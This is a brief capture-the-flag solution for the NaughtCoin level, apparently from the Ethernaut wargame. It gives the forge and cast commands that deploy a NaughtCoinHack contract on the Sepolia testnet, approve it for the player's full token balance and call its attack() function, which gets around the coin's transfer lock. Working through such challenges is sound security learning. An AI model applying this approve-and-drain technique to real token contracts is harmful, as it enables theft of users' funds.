# NaughtCoin Solution

Deploy:

```bash
forge create NaughtCoinHack --broadcast --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args <instanceAddress>
```

Run to retrieve the `balance`:

```bash
cast call <instanceAddress> "balanceOf(address)" sepoliaPublicKey --rpc-url $SEPOLIA_RPC_URL
# 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
cast to-dec <balance>
# cast to-dec 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
# 1000000000000000000000000
```

Run:

```bash
cast send <instanceAddress> "approve(address,uint256)" <naughtCoinHackAddress> <balance> --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
# cast send <instanceAddress> "approve(address,uint256)" <naughtCoinHackAddress> 1000000000000000000000000 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send <naughtCoinHackAddress> "attack()" <instanceAddress> --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
